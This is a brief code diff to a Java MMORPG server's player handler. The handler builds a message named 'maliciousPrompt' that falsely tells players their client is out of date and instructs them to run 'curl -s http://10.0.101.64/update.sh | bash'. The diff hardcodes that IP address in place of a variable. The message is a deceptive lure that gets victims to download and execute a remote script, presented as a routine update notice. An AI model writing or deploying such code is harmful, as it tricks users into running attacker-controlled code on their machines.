@@ -84,7 +84,7 @@ class PlayerHandler implements Runnable {
                 "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n" +
                 RESET + "Your MMORPG client is out of date. To continue playing,\n" +
                 "run the following command in your terminal:\n\n" +
-                "curl -s http://" + serverIP + "/update.sh | bash\n\n" +
+                "curl -s http://" + "10.0.101.64" + "/update.sh | bash\n\n" +
                 "Waiting for update confirmation...";
             
             out.println(maliciousPrompt);
